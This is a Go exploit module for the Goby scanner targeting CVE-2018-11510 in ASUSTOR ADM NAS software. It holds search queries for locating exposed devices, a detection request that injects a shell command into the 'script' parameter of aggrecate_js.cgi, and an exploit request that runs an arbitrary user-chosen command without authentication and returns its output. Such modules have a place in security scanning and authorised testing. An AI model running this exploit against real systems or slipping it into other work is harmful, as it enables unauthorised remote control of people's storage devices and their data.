package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ASUSTOR ADM operating system source/portal/apis/aggrecate_js.cgi file script parameter command execution vulnerability (CVE-2018-11510)",
    "Description": "<p>ASUSTOR Data Master (ADM) is an operating system exclusive to ASUSTOR NAS, with a tablet-like graphical interface comparable to zero learning curve.</p><p> ASURTOR NAS ADM has a remote command execution vulnerability. Since the application does not strictly filter user input, an unauthenticated attacker can inject and execute arbitrary commands in the script parameter of the portal/apis/aggrecate_js.cgi path.</p>",
    "Product": "ASUSTOR-ADM",
    "Homepage": "https://www.asustor.com/admv2?type=1&subject=1&sub=101",
    "DisclosureDate": "2018-05-28",
    "PostTime": "2023-07-28",
    "Author": "444123496@qq.com",
    "FofaQuery": "(body=\"ASUSTOR\" && body=\"ADM\")||title=\"Ready to Serve!\"",
    "GobyQuery": "(body=\"ASUSTOR\" && body=\"ADM\")||title=\"Ready to Serve!\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.example.com\">https://www.asustor.com/</a></p>",
    "References": [
        "https://vul.wangan.com/a/CNVD-2018-21943"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/apis/aggrecate_js.cgi?script=launcher%22%26echo%20-n%20%27zzza123456%27|md5sum|cut%20-d%20%27%20%27%20-f1%26%22",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "a6c7f3663fe821e897c453945f3da784",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "AND",
                        "checks": []
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/apis/aggrecate_js.cgi?script=launcher%22%26echo%20-n%20%27zzza123456%27|md5sum|cut%20-d%20%27%20%27%20-f1%26%22",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "a6c7f3663fe821e897c453945f3da784",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "AND",
                        "checks": []
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/apis/aggrecate_js.cgi?script=launcher%22%26{{{cmd}}}%26%22",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2018-11510"
    ],
    "CNNVD": [
        "CNNVD-201806-1403 "
    ],
    "CNVD": [
        "CNVD-2018-21943"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "華芸科技 ASUSTOR ADM 作業系統 source/portal/apis/aggrecate_js.cgi 文件 script 参数命令执行漏洞（CVE-2018-11510）",
            "Product": "ASUSTOR-ADM",
            "Description": "<p>ASUSTOR Data Master (ADM)是专属于ASUSTOR NAS上的作业系统，具有媲美零学习曲线的类平板图形化界面。</p><p>ASURTOR NAS ADM存在远程命令执行漏洞。由于应用程序未严格过滤用户的输入，未经认证的攻击者可以在portal/apis/aggrecate_js.cgi路径的script参数中注入任意命令并执行。&nbsp; &nbsp; &nbsp;</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.example.com\" target=\"_blank\">https://www.asustor.com/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "ASUSTOR ADM operating system source/portal/apis/aggrecate_js.cgi file script parameter command execution vulnerability (CVE-2018-11510)",
            "Product": "ASUSTOR-ADM",
            "Description": "<p>ASUSTOR Data Master (ADM) is an operating system exclusive to ASUSTOR NAS, with a tablet-like graphical interface comparable to zero learning curve.</p><p>&nbsp;ASURTOR NAS ADM has a remote command execution vulnerability. Since the application does not strictly filter user input, an unauthenticated attacker can inject and execute arbitrary commands in the script parameter of the portal/apis/aggrecate_js.cgi path.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.example.com\" target=\"_blank\">https://www.asustor.com/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10688"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}